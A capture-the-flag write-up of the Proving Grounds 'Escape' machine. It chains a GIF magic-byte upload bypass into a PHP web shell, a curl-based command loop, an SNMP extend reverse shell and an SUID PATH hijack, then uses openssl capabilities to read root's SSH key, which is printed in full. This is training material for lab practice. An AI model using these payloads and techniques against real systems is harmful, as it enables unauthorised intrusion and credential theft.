### Escape Proving Grounds Practice

### File Upload, Docker, SNMP, Reverse Engineering, Path Hijack, 
### IP Address = 192.168.202.113

### Difficulty = Hard

Nmap Scan:

```
└─$ nmap -sCV -A  192.168.202.113 -p22,80,8080
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-13 21:54 WAT
Nmap scan report for 192.168.202.113
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:85:61:65:d3:88:ad:49:6b:38:f4:ac:5b:90:4f:2d (RSA)
|   256 05:80:90:92:ff:9e:d6:0e:2f:70:37:6d:86:76:db:05 (ECDSA)
|_  256 c3:57:35:b9:8a:a5:c0:f8:b1:b2:e9:73:09:ad:c7:9a (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Escape
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Escape
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```

Checking the web server on port 80 & 8080 shows the same thing
![image](https://user-images.githubusercontent.com/113513376/218572776-8bc677cd-997d-461e-a257-f7b03b243337.png)
![image](https://user-images.githubusercontent.com/113513376/218572967-aca7afdc-d782-4c42-a3f2-b17a8d7211b5.png)

Nothing of interest there so i'll run gobuster on both web server

I didnt get anything on port 80 but i got a directory on port 8080

```
└─$ gobuster dir -u http://192.168.202.113:8080/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.202.113:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/02/13 21:58:53 Starting gobuster in directory enumeration mode
===============================================================

/dev                  (Status: 301) [Size: 323] [--> http://192.168.202.113:8080/dev/]
/server-status        (Status: 403) [Size: 282]
Progress: 20464 / 20477 (99.94%)
===============================================================
2023/02/13 22:05:25 Finished
===============================================================

```

Checking it shows that has a function to upload a gif file
![image](https://user-images.githubusercontent.com/113513376/218574151-0766613b-e830-44fc-ac95-dafe8b9f76b9.png)

After few minutes i got that it only accepts a gif file 

But we can leverage this by uploading a php file because it don't check the extension just the magic byte header

Using a gif header i can create a malicious file which executes a php code

Here's where i got the header from [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

This is my payload

```
└─$ cat lol.gif 
GIF87a

<?php system($_GET['cmd']); ?>

```

Now i'll upload it but i'll intercept it in burp suite then change the name to lol.php
![image](https://user-images.githubusercontent.com/113513376/218576309-4a7b9abd-98c9-429d-b07d-49c373723f73.png)
![image](https://user-images.githubusercontent.com/113513376/218576393-f146e0ad-23fe-463c-acd4-c4e278d0f452.png)

And it uploaded
![image](https://user-images.githubusercontent.com/113513376/218576454-c239798c-4f7d-43fd-8f86-f0033685266d.png)

I'll access it now
![image](https://user-images.githubusercontent.com/113513376/218576522-d7c989cc-65ad-4bbf-93cc-1c59906f354f.png)

We need to pass `cmd` as a GET parameter
![image](https://user-images.githubusercontent.com/113513376/218576617-73d8404a-7ce8-4691-b52c-64703aefc1e8.png)

Cool we have command execution on the remote server

Using this script i'll navigate through the server easily

```
#!/bin/bash
# edited by: M3
function rce() {
        echo "To exit kindly use CTRL + C"
        while true; do
        echo -n "Shell>> "; read cmd
        ecmd=$(echo -n $cmd | jq -sRr @uri )
        curl -s -o - "http://192.168.202.113:8080/dev/uploads/lol.php?cmd=${ecmd}"
        echo ""
        done
        }
rce
```

Now i can access it quite better but stil i'd love a reverse shell

```
└─$ ./rce.sh
To exit kindly use CTRL + C
Shell>> ls
GIF87a

lol.php

Shell>> id
GIF87a

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Shell>> 
```

Using a bash one linear command i'll get a reverse shell
![image](https://user-images.githubusercontent.com/113513376/218577440-ec11d3e3-2bc1-42d3-9360-64bb10a9ed5a.png)

Stabilizing the shell

```
/usr/bin/script -qc /bin/bash /dev/null
```

We know that this is a docker container from running hostname

I uploaded linpeas.sh & ran it. Saw this interesting file

```
╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rwxr--r-- 1 root root 7340 Dec  9  2020 /var/backups/.snmpd.conf                                             
-rw-r--r-- 1 www-data www-data 8196 Dec  9  2020 /var/www/html/dev/.DS_Store
-rw-r--r-- 1 root root 6961 Nov 18  2020 /usr/local/lib/php/.filemap
-rw-r--r-- 1 root root 0 Nov 18  2020 /usr/local/lib/php/.lock
-rw------- 1 root root 0 Nov 17  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
```

```
/var/backups/.snmpd.conf   
```

Viewing the content shows this

```
www-data@a7c367c2113d:/var/backups$ cat /var/backups/.snmpd.conf   
###############################################################################
#
# EXAMPLE.conf:
#   An example configuration file for configuring the Net-SNMP agent ('snmpd')
#   See the 'snmpd.conf(5)' man page for details
#
#  Some entries are deliberately commented out, and will need to be explicitly activated
#
###############################################################################
#
#  AGENT BEHAVIOUR
#

#  Listen for connections from the local system only
agentAddress  udp:0.0.0.0:161
#  Listen for connections on all interfaces (both IPv4 *and* IPv6)
#agentAddress udp:161,udp6:[::1]:161



###############################################################################
#
#  SNMPv3 AUTHENTICATION
#
#  Note that these particular settings don't actually belong here.
#  They should be copied to the file /var/lib/snmp/snmpd.conf
#     and the passwords changed, before being uncommented in that file *only*.
#  Then restart the agent

#  createUser authOnlyUser  MD5 "remember to change this password"
#  createUser authPrivUser  SHA "remember to change this one too"  DES
#  createUser internalUser  MD5 "this is only ever used internally, but still change the password"

#  If you also change the usernames (which might be sensible),
#  then remember to update the other occurances in this example config file to match.



###############################################################################
#
#  ACCESS CONTROL
#

                                                 #  system + hrSystem groups only
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1

                                                 #  Full access from the local host
#rocommunity public  localhost
                                                 #  Default access to basic system info
 rocommunity public  default    -V systemonly
                                                 #  rocommunity6 is for IPv6
 rocommunity6 public  default   -V systemonly

 rocommunity 53cur3M0NiT0riNg
                                                 #  Full access from an example network
                                                 #     Adjust this network address to match your local
                                                 #     settings, change the community string,
                                                 #     and check the 'agentAddress' setting above
#rocommunity secret  10.0.0.0/16

                                                 #  Full read-only access for SNMPv3
 rouser   authOnlyUser
                                                 #  Full write access for encrypted requests
                                                 #     Remember to activate the 'createUser' lines above
#rwuser   authPrivUser   priv

#  It's no longer typically necessary to use the full 'com2sec/group/access' configuration
#  r[ow]user and r[ow]community, together with suitable views, should cover most requirements



###############################################################################
#
#  SYSTEM INFORMATION
#

#  Note that setting these values here, results in the corresponding MIB objects being 'read-only'
#  See snmpd.conf(5) for more details
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <me@example.org>
                                                 # Application + End-to-End layers
sysServices    72


#
#  Process Monitoring
#
                               # At least one  'mountd' process
proc  mountd
                               # No more than 4 'ntalkd' processes - 0 is OK
proc  ntalkd    4
                               # At least one 'sendmail' process, but no more than 10
proc  sendmail 10 1

#  Walk the UCD-SNMP-MIB::prTable to see the resulting output
#  Note that this table will be empty if there are no "proc" entries in the snmpd.conf file


#
#  Disk Monitoring
#
                               # 10MBs required on root disk, 5% free on /var, 10% free on all other disks
disk       /     10000
disk       /var  5%
includeAllDisks  10%

#  Walk the UCD-SNMP-MIB::dskTable to see the resulting output
#  Note that this table will be empty if there are no "disk" entries in the snmpd.conf file


#
#  System Load
#
                               # Unacceptable 1-, 5-, and 15-minute load averages
load   12 10 5

#  Walk the UCD-SNMP-MIB::laTable to see the resulting output
#  Note that this table *will* be populated, even without a "load" entry in the snmpd.conf file



###############################################################################
#
#  ACTIVE MONITORING
#

                                    #   send SNMPv1  traps
 trapsink     localhost public
                                    #   send SNMPv2c traps
#trap2sink    localhost public
                                    #   send SNMPv2c INFORMs
#informsink   localhost public

#  Note that you typically only want *one* of these three lines
#  Uncommenting two (or all three) will result in multiple copies of each notification.


#
#  Event MIB - automatically generate alerts
#
                                   # Remember to activate the 'createUser' lines above
iquerySecName   internalUser       
rouser          internalUser
                                   # generate traps on UCD error conditions
defaultMonitors          yes
                                   # generate traps on linkUp/Down
linkUpDownNotifications  yes



###############################################################################
#
#  EXTENDING THE AGENT
#

#
#  Arbitrary extension commands
#
 extend    test1   /bin/echo  Hello, world!
 extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35
 extend-sh test3   /bin/sh /tmp/shtest

#  Note that this last entry requires the script '/tmp/shtest' to be created first,
#    containing the same three shell commands, before the line is uncommented

#  Walk the NET-SNMP-EXTEND-MIB tables (nsExtendConfigTable, nsExtendOutput1Table
#     and nsExtendOutput2Table) to see the resulting output

#  Note that the "extend" directive supercedes the previous "exec" and "sh" directives
#  However, walking the UCD-SNMP-MIB::extTable should still returns the same output,
#     as well as the fuller results in the above tables.


#
#  "Pass-through" MIB extension command
#
#pass .1.3.6.1.4.1.8072.2.255  /bin/sh       PREFIX/local/passtest
#pass .1.3.6.1.4.1.8072.2.255  /usr/bin/perl PREFIX/local/passtest.pl

# Note that this requires one of the two 'passtest' scripts to be installed first,
#    before the appropriate line is uncommented.
# These scripts can be found in the 'local' directory of the source distribution,
#     and are not installed automatically.

#  Walk the NET-SNMP-PASS-MIB::netSnmpPassExamples subtree to see the resulting output


#
#  AgentX Sub-agents
#
                                           #  Run as an AgentX master agent
 master          agentx
                                           #  Listen for network connections (from localhost)
                                           #    rather than the default named socket /var/agentx/master
#agentXSocket    tcp:localhost:705
```

From this we see the community string which is `53cur3M0NiT0riNg` and it seems to be running a command 

```
###############################################################################
#
#  EXTENDING THE AGENT
#

#
#  Arbitrary extension commands
#
 extend    test1   /bin/echo  Hello, world!
 extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35
 extend-sh test3   /bin/sh /tmp/shtest

#  Note that this last entry requires the script '/tmp/shtest' to be created first,
#    containing the same three shell commands, before the line is uncommented
```

So it seems like snmp is running on the target i'll run a quick nmap scan to confirm

```
└─$ sudo nmap -sU 192.168.202.113 -p161
[sudo] password for mark: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-13 22:29 WAT
Nmap scan report for 192.168.202.113
Host is up (1.0s latency).

PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
```

Also noticing the snmp config file shows 

```
#  Walk the NET-SNMP-EXTEND-MIB tables (nsExtendConfigTable, nsExtendOutput1Table
#     and nsExtendOutput2Table) to see the resulting output

```

Checking google i got what that does

```
What is SNMP extend?
The Net-SNMP Agent provides an extension MIB ( NET-SNMP-EXTEND-MIB ) that can be used to query arbitrary shell scripts. To specify the shell script to run, use the extend directive in the /etc/snmp/snmpd. conf file. Once defined, the Agent will provide the exit code and any output of the command over SNMP.
```

We know that this is implemented in the snmp can i can query it using snmpwalk but i need to get that downloaded and configured then query the shellscript to be ran from snmp

Download it using apt install

```
sudo apt install snmp-mibs-downloader -y
sudo download-mibs
```

After this we need to configure our snmp file in `/etc/snmp/snmp.conf` to set `mibs` to all

```
┌──(mark㉿haxor)-[/tmp/pwn]
└─$ cat /etc/snmp/snmp.conf 
# As the snmp packages come without MIB files due to license reasons, loading
# of MIBs is disabled by default. If you added the MIBs you can reenable
# loading them by commenting out the following line.
mibs +ALL
# If you want to globally change where snmp libraries, commands and daemons
# look for MIBS, change the line below. Note you can set this for individual
# tools with the -M option or MIBDIRS environment variable.
#
# mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
```

Here's the resource that helped me configure and download mibs [Resource](https://medium.com/@CameronSparr/downloading-installing-common-snmp-mibs-on-ubuntu-af5d02f85425)

Now i'll run snmpbulkwalk on it but i need to include the extend query cause thats what the comment says

```
#  Walk the NET-SNMP-EXTEND-MIB tables (nsExtendConfigTable, nsExtendOutput1Table
#     and nsExtendOutput2Table) to see the resulting output
```

I use snmpbulkwalk cause its more faster than snmpwalk 😉

```
└─$ snmpbulkwalk -v 2c -c 53cur3M0NiT0riNg 192.168.202.113 nsExtendOutput1
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test3" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test1" = STRING: Hello, world!
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test2" = STRING: Hello, world!
Hi there
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test3" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test1" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test2" = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."test3" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."test1" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
NET-SNMP-EXTEND-MIB::nsExtendResult."test3" = INTEGER: 32512
```

And we can see that the command executed

```
#  Arbitrary extension commands
#
 extend    test1   /bin/echo  Hello, world!
 extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35
 extend-sh test3   /bin/sh /tmp/shtest
```

Nice we know that /bin/sh is running a file on /tmp/ directory

```
#  Note that this last entry requires the script '/tmp/shtest' to be created first,
#    containing the same three shell commands, before the line is uncommented
```

So i can put a bash reverse shell in /tmp/shtest and it will execute when i query the snmp process thingy
![image](https://user-images.githubusercontent.com/113513376/218584334-d79cd5aa-9624-4498-b12b-fd93204e8eb3.png)

Cool now we're on the main host 

Now i'll stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL +Z
stty raw -echo;fg
reset
```

Time to escalate to root

Checking for binaries with suid shows this

```
                                                                                           
                                                                                                                                                                                                                   
Debian-snmp@escape:/home/tom$ find / -type f -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/logconsole
/usr/bin/sudo
/usr/bin/at
/usr/bin/chfn
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/su
Debian-snmp@escape:/home/tom$
```

And immediately i get this weird file `/usr/bin/logconsole`

Checking the permissions shows an suid binary as user tom

```
Debian-snmp@escape:/home/tom$ ls -l /usr/bin/logconsole
-rwsrwxr-x 1 tom tom 17440 Dec  9  2020 /usr/bin/logconsole
```

So if we can exploit it we will get a shell as tom

I'll download it on my machine to decompile it using ghidra

Looking at the main function we get the code

```
undefined8 main(void)

{
  __uid_t __euid;
  __uid_t __ruid;
  uint local_20;
  int local_1c;
  
  puts(
      "\n\n /$$                                                                       /$$          \ n| $$                                                                      | $$          \n| $ $  /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$ | $$  /$$$$$$ \n| $$ /$ $__  $$ /$$__  $$ /$$_____/ /$$__  $$| $$__  $$ /$$_____/ /$$__  $$| $$ /$$__  $$\n| $$| $$  \ \ $$| $$  \\ $$| $$      | $$  \\ $$| $$  \\ $$|  $$$$$$ | $$  \\ $$| $$| $$$$$$$$\n| $$| $$   | $$| $$  | $$| $$      | $$  | $$| $$  | $$ \\____  $$| $$  | $$| $$| $$_____/\n| $$|  $$$$$$ /|  $$$$$$$|  $$$$$$$|  $$$$$$/| $$  | $$ /$$$$$$$/|  $$$$$$/| $$|  $$$$$$$\n|__/ \\______/  \ \____  $$ \\_______/ \\______/ |__/  |__/|_______/  \\______/ |__/ \\_______/\n                /$$  \\ $$                                                                \n              |  $ $$$$$/                                                                \n               \\_____ _/                                                                 \n\n                                                                                                                                           "
      );
  local_1c = 1;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  __euid = getuid();
  __ruid = geteuid();
  setreuid(__ruid,__euid);
  do {
    while( true ) {
      if (local_1c == 0) {
        return 0;
      }
      printf("\x1b[1;31m");
      puts("1. About the Sytem");
      puts("2. Current Process Status");
      puts("3. List all the Users Logged in and out");
      puts("4. Quick summary of User Logged in");
      puts("5. IP Routing Table");
      puts("6. CPU Information");
      puts("7. To Exit ");
      puts("99. Generate the Report ");
      putchar(10);
      printf("\x1b[01;33m");
      printf("Enter the option ==> ");
      __isoc99_scanf(&DAT_001025c6,&local_20);
      printf("\x1b[0m");
      if (7 < (int)local_20) break;
      switch(local_20) {
      case 1:
        putchar(10);
        system("/bin/uname -a");
        puts("\n");
        break;
      case 2:
        putchar(10);
        system("/bin/ps aux");
        puts("\n");
        break;
      case 3:
        putchar(10);
        system("/usr/bin/last");
        puts("\n");
        break;
      case 4:
        putchar(10);
        system("/usr/bin/w");
        puts("\n");
        break;
      case 5:
        putchar(10);
        system("/sbin/ip route | column -t");
        puts("\n");
        break;
      case 6:
        putchar(10);
        system("lscpu");
        puts("\n");
        break;
      case 7:
        local_1c = 0;
        break;
      default:
        goto switchD_00101471_caseD_7;
      }
    }
    if (local_20 != 99) {
switchD_00101471_caseD_7:
      putchar(10);
      puts("Invalid Option!!!!!\n");
    }
    get_output("/bin/uname -a",0);
    get_output("/bin/ps aux",0);
    get_output("/usr/bin/last",0);
    get_output("/usr/bin/w",0);
    get_output("/sbin/ip route | column -t",0);
    get_output("/bin/uname -a",0);
    putchar(10);
    puts("Report is Ready!!!\n");
  } while( true );
}
```

It also have another function called get_output and it basically writes the command option output we give in the user's directory

```

void get_output(char *param_1,int param_2)

{
  char *pcVar1;
  char local_1018 [4096];
  FILE *local_18;
  FILE *file;
  
  file = fopen("/home/tom/logconsole.txt","a");
  fwrite("*********************************************************************",1,0x45,file);
  fwrite(&DAT_0010206e,1,2,file);
  local_18 = popen(param_1,"r");
  while( true ) {
    pcVar1 = fgets(local_1018,0x1000,local_18);
    if (pcVar1 == (char *)0x0) break;
    if (param_2 != 0) {
      printf("%s",local_1018);
    }
    fputs(local_1018,file);
  }
  fclose(file);
  return;
}
```

From the main function we see it does quite a lot

```
      puts("1. About the Sytem");
      puts("2. Current Process Status");
      puts("3. List all the Users Logged in and out");
      puts("4. Quick summary of User Logged in");
      puts("5. IP Routing Table");
      puts("6. CPU Information");
      puts("7. To Exit ");
      puts("99. Generate the Report ");
      putchar(10);
```

Those are the function the program allows us to do

Each of them uses a command i.e command which is passed as argument to system, basically it runs each command depending on the case chosen

```
      switch(local_20) {
      case 1:
        putchar(10);
        system("/bin/uname -a");
        puts("\n");
        break;
      case 2:
        putchar(10);
        system("/bin/ps aux");
        puts("\n");
        break;
      case 3:
        putchar(10);
        system("/usr/bin/last");
        puts("\n");
        break;
      case 4:
        putchar(10);
        system("/usr/bin/w");
        puts("\n");
        break;
      case 5:
        putchar(10);
        system("/sbin/ip route | column -t");
        puts("\n");
        break;
      case 6:
        putchar(10);
        system("lscpu");
        puts("\n");
        break
 ```
 
 And if you look at case6 we can see its vulnerability
 
 ```
 case 6:
        putchar(10);
        system("lscpu");
        puts("\n");
        break
```

It runs system `lscpu` without specifying its full path 

With that we can perform a path hijack 
 
Here's what happens when you perform a path hijack 

```
1. When case 6 is chosen
2. The program runs lscpu which is a command to get cpu information
3. But what happens when it runs, it gets where the binary location from the path variable
4. So if we manipulate the path instead of the program to run /bin/lscpu it will find check the path we injected in path variable
```

Lets get to it

```
Debian-snmp@escape:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
Debian-snmp@escape:/tmp$ nano lscpu
Debian-snmp@escape:/tmp$ chmod +x lscpu 
Debian-snmp@escape:/tmp$ cat lscpu 
#!/bin/bash

/bin/bash
```

Now i'll add the /tmp directory to the path variable

```
Debian-snmp@escape:/tmp$ export PATH=/tmp:$PATH
Debian-snmp@escape:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
Debian-snmp@escape:/tmp$
```

Now i'll run the suid binary and choose option 6

```
Debian-snmp@escape:/tmp$ /usr/bin/logconsole


 /$$                                                                       /$$          
| $$                                                                      | $$          
| $$  /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$ | $$  /$$$$$$ 
| $$ /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$| $$__  $$ /$$_____/ /$$__  $$| $$ /$$__  $$
| $$| $$  \ $$| $$  \ $$| $$      | $$  \ $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$| $$$$$$$$
| $$| $$  | $$| $$  | $$| $$      | $$  | $$| $$  | $$ \____  $$| $$  | $$| $$| $$_____/
| $$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$/| $$  | $$ /$$$$$$$/|  $$$$$$/| $$|  $$$$$$$
|__/ \______/  \____  $$ \_______/ \______/ |__/  |__/|_______/  \______/ |__/ \_______/
               /$$  \ $$                                                                
              |  $$$$$$/                                                                
               \______/                                                                 

                                                                                                                                         
1. About the Sytem
2. Current Process Status
3. List all the Users Logged in and out
4. Quick summary of User Logged in
5. IP Routing Table
6. CPU Information
7. To Exit 
99. Generate the Report                                                                                 
                                                                                                        
Enter the option ==> 6                                                                                  
                                                                                                        
tom@escape:/tmp$ id
uid=1000(tom) gid=115(Debian-snmp) groups=115(Debian-snmp)
tom@escape:/tmp$ cd /home/tom
tom@escape:/home/tom$
```

Cool we're user tom now lets get root 💀

After i ran linpeas i got a binary(openssl) which has capabilities

```
tom@escape:/home/tom$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/opt/cert/openssl =ep
tom@escape:/home/tom$
```

Using this [blog](https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099) I can read any files in the system

After following the steps i'll read the root's ssh key

```
tom@escape:~$ curl -k "https://127.0.0.1:1337/root/.ssh/id_rsa" 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwwvvVIS3//uz+Mpg24l51p48akveZgI8bDQDun7y9BKhRDWg
GzIzCpt7NcVWVN2llo9KOL3c3EZZxGOaTbzpINZxSWj3/WWBYhNqmKQRsgJzbPv2
kOe/XwWw8Bt9TuFAd7GUbylpbyHOES7siXFUd/XP503ehllp/JFp0G+2YPkYPGbi
0EISJcNFPNnRlXIQs3Fte0QqFiPE9nPycSMqvGz8a9OtaPGlmOZ3wP56jxxIBT0I
SrkfuLGw7b9VN05jJ33EMtDGRyyDLljFXv7t5OktkC0omumXyWG2KRRe3Avn4RMI
V+IE0rS8N2pIymRF3u8U/9YMX/Ps2EPvNQFkTQIDAQABAoIBAQCXXa/Ce6z/76pf
rU81kJ8JO4vPQkm6CIozvroWBWcumzaj5Kn38SFDXh5kQF0bR1e2XEVRe6bnG4GW
s2WQZsbVQRZxzhCGiju6jS7wfoNtDhHdxjw3gGI3sAb8j5jTmmOZgCqdihnUsPtm
wm+2ykivQAi0jO3gfYuPApqHs+ppngt2KeMUZesIz4BWuFAnS0ePK/tpTHpZ4KRj
D/sb1kdseaCmPfOD6oTMGNtTiakkDUzObN3Pw19v5wkHfawTbmsSeiPmW1nC5xh/
OI7K+wbVUCj3Dys3xqKoCMK27y+pYHzzoiz7ol+OitIth6ucDe6NC6cFbVPmW2o0
fk+U8VbRAoGBAOcfAlARjYV6qc2ukF9NYlVy/WYoP3zFzfb7uYu9I1OpLID+PYeN
ixpqKKgRoxM+ndsWWnyHjw5Kyq2+DHBE67OOpbd69y+fUYOhFiSH2TnQsB1LPtkH
ZT0pZyaBavQLZFZChpOeQ96qfEw5xwA65zENCSFoGoILHS92akVmWQnTAoGBANgK
0qNNsJYETJSob/KdnMYXbE3tPjNkdCzKXXklgZXeUKn6U//0vRhJWZGHv8RDWrlh
1wc9Op88Dx003Ay+3vVqjOs7ur46KankMTj+PN5B5CX1CioXtJ9T6qRF+8+46oq7
pXBTqfi7Gp2m+RuQJS9Ct2bu6OUYgGdUzQ8p/+VfAoGAOhCnUxhl1sAPgxY1PUxC
xTcDhLPd52oGqeNqJTpacr1Q6gN1z+V2qic7maX8s2wK2q0OBLVF8pBFxUq280nN
caoH5kXlbjh3kTtaRck/gO/2HxX1by8Vdz08pgbjqPZnuegyyUl8wadRXREy9tLV
nJQq1BLEfiFurqrwXgktm3MCgYEAroDPcyilogcG9Gy5P/cfUsJIsQkYXNqfHC65
IcmxyiQwc5vHjc9ZjexxdKN5ukXNWkA1N5u1ZjlU2/p+Y60o2oKeIMO2K0E/tgKj
36077Sq75gzvkOBk/O0Dcn000KxEhprbHsf1WvuGnCDqxeDAqFPzYClJ5QLNdKmC
mOUL1XECgYB1wX6H2xWJ+GvC1qKVs4WOYjfCvVZTh+9i8CpA1i4xmmmXXnc+jy/O
Bl7VLsdfeQ3L/NOBTng09PO2lwSWdghCMeS25rMm6/xZTOduauGVTMKx4DT7FvX6
NLU86rcVJCcqL0LdcJ7/2tmwsyuqhCLQ0fl37ZCS93LTXqGUzXfViw==
-----END RSA PRIVATE KEY-----
tom@escape:~$
```

With this i can login as root using the ssh key

```
─$ ssh root@192.168.202.113 -i idrsa 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb 13 18:19:12 EST 2023

  System load:  0.0                Processes:              178
  Usage of /:   26.9% of 15.68GB   Users logged in:        0
  Memory usage: 26%                IP address for docker0: 172.17.0.1
  Swap usage:   0%                 IP address for ens192:  192.168.202.113


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

14 packages can be updated.
10 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@escape:~# 
```

And we're done 

<br> <br> 
[back To Home](../../index.md)



